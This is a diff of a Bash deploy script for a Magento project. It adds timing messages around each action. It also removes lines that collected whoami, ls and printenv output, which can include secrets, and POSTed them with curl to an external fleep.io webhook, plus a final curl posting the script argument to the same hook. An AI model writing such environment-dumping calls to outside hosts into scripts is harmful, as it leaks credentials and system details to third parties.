@@ -63,33 +63,48 @@ DATE_PT_BR=$(date '+%d/%m/%Y %H:%M:%S')
 
 #
 
+functionBefore() {
+
+    DATA_HORA_INICIAL=$(date '+%d/%m/%Y %H:%M:%S')
+
+    DATA_HORA_EN_US=$(date '+%Y-%m-%d %H:%M:%S')
+}
+
+functionAfter() {
+
+    DATA_HORA_FINAL=$(date '+%d/%m/%Y %H:%M:%S')
+
+    echo
+    echo "${BOLD} DATA_HORA_INICIAL: $DATA_HORA_INICIAL ${NORMAL}"
+    echo
+    echo "${BOLD} DATA_HORA_FINAL: $DATA_HORA_FINAL ${NORMAL}"
+    echo
+
+}
+
 default () {
 
 echo -e "${ONWHITE} - ${NORMAL}"
 
 echo -e "Default"
 
-ARRAY=([0]="05/07/2017 12:16:22" [1]=$1 [2]=`pwd` [3]=`ls` [4]=`printenv` )
-ARRAY=([0]="$(date +%Y-%m-%d_%H-%M-%S)"  [1]=$1 [2]=`pwd` [3]=`ls` [4]=`whoami` [5]=`printenv` )
-RETURN=""
+echo -e "${ONYELLOW} date ${NORMAL}"
 
-#echo "Array size: ${#ARRAY[*]}"
+echo $(date +%Y-%m-%d_%H-%M-%S)
 
-#echo "Array items and indexes:"
-for index in ${!ARRAY[*]}
-do
-    #RETURN="${RETURN}\n"
-    RETURN="${RETURN}${index}:
-${ARRAY[$index]}
+echo -e "${ONYELLOW} pwd ${NORMAL}"
 
-"
-    #RETURN="${RETURN}\n"
-done
+pwd
 
-#echo -e $RETURN
-echo $RETURN
+ls
 
-curl --request POST "https://fleep.io/hook/OLuIRi0JRt2yv5OQisX6tg" --data "${RETURN}"
+echo -e "${ONYELLOW} whoami ${NORMAL}"
+
+whoami
+
+echo -e "${ONYELLOW} printenv ${NORMAL}"
+
+printenv
 
 }
 
@@ -473,44 +488,64 @@ done
 
 case $1 in
     download_install)
-        echo "${BOLD} Processing... ${NORMAL}"
+        echo "${BOLD} 1/3 | functionBefore...${NORMAL}"
+        functionBefore ##
+        echo "${BOLD} 2/3 | >>> ...${NORMAL}"
         download_install
+        echo "${BOLD} 3/3 | functionAfter...${NORMAL}"
+        functionAfter ##
         echo
-        echo "${BOLD} Process complete! ${NORMAL}"
+        echo "${BOLD}Process complete!${NORMAL}"
         echo
         ;;
 
     magento_sample_data_install)
-        echo "${BOLD} Processing... ${NORMAL}"
+        echo "${BOLD} 1/3 | functionBefore...${NORMAL}"
+        functionBefore ##
+        echo "${BOLD} 2/3 | >>> ...${NORMAL}"
         magento_sample_data_install
+        echo "${BOLD} 3/3 | functionAfter...${NORMAL}"
+        functionAfter ##
         echo
-        echo "${BOLD} Process complete! ${NORMAL}"
+        echo "${BOLD}Process complete!${NORMAL}"
         echo
         ;;
 
     magento_install)
-        echo "${BOLD} Processing... ${NORMAL}"
+        echo "${BOLD} 1/3 | functionBefore...${NORMAL}"
+        functionBefore ##
+        echo "${BOLD} 2/3 | >>> ...${NORMAL}"
         magento_install
+        echo "${BOLD} 3/3 | functionAfter...${NORMAL}"
+        functionAfter ##
         echo
-        echo "${BOLD} Process complete! ${NORMAL}"
+        echo "${BOLD}Process complete!${NORMAL}"
         echo
         ;;
 
     postdeploy)
-        echo "${BOLD} Processing... ${NORMAL}"
+        echo "${BOLD} 1/3 | functionBefore...${NORMAL}"
+        functionBefore ##
+        echo "${BOLD} 2/3 | >>> ...${NORMAL}"
         postdeploy
+        echo "${BOLD} 3/3 | functionAfter...${NORMAL}"
+        functionAfter ##
         echo
-        echo "${BOLD} Process complete! ${NORMAL}"
+        echo "${BOLD}Process complete!${NORMAL}"
         echo
         ;;
 
     *|help)
+        echo "${BOLD} 1/3 | functionBefore...${NORMAL}"
+        functionBefore ##
+        echo "${BOLD} 2/3 | >>> ...${NORMAL}"
         default
+        echo "${BOLD} 3/3 | functionAfter...${NORMAL}"
+        functionAfter ##
+        echo
+        echo "${BOLD}Process complete!${NORMAL}"
+        echo
         ;;
 esac
-
-#
-
-curl --request POST "https://fleep.io/hook/OLuIRi0JRt2yv5OQisX6tg" --data $1
 
 #
